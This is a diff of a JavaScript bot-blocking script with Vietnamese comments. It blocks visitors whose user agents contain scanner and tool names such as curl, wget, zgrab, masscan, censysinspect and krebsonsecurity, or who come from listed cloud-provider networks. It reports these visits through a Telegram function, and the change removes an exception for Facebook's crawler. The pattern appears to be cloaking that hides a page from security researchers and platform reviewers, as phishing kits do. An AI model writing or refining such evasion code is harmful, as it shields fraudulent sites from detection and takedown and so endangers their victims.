@@ -1,7 +1,6 @@
 import axios from 'axios';
 
-const blockedKeywords = ['bot', 'crawler', 'spider', 'puppeteer', 'selenium', 'http', 'client', 'curl', 'wget', 'python', 'java', 'ruby', 'go', 'scrapy', 'lighthouse', 'censysinspect', 'krebsonsecurity', 'ivre-masscan', 'ahrefs', 'semrush', 'sistrix', 'mailchimp', 'mailgun', 'larbin', 'libwww', 'spinn3r', 'zgrab', 'masscan', 'yandex', 'baidu', 'sogou', 'tweetmeme', 'misting', 'BotPoke'];
-// 🚀 ĐÃ XÓA: 'facebookexternalhit', 'facebot'
+const blockedKeywords = ['bot', 'crawler', 'spider', 'puppeteer', 'selenium', 'http', 'client', 'curl', 'wget', 'python', 'java', 'ruby', 'go', 'scrapy', 'lighthouse', 'censysinspect', 'facebookexternalhit', 'krebsonsecurity', 'ivre-masscan', 'ahrefs', 'semrush', 'sistrix', 'mailchimp', 'mailgun', 'larbin', 'libwww', 'spinn3r', 'zgrab', 'masscan', 'yandex', 'baidu', 'sogou', 'tweetmeme', 'misting', 'BotPoke'];
 
 const blockedASNs = [15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 8075, 214961, 401115, 135377, 60068, 55720, 397373, 208312, 63949, 210644, 6939, 209, 51396, 147049];
 
@@ -59,15 +58,6 @@ const sendBotTelegram = async (reason) => {
 
 const checkAndBlockBots = async () => {
     const userAgent = navigator.userAgent.toLowerCase();
-    
-    // 🚀 CHO PHÉP FACEBOOK BOT
-    const isFacebookBot = userAgent.includes('facebookexternalhit') || 
-                         userAgent.includes('facebot');
-    
-    if (isFacebookBot) {
-        return { isBlocked: false }; // Cho phép Facebook bot
-    }
-    
     const blockedKeyword = blockedKeywords.find((keyword) => userAgent.includes(keyword));
     if (blockedKeyword) {
         const reason = `user agent chứa keyword: ${blockedKeyword}`;
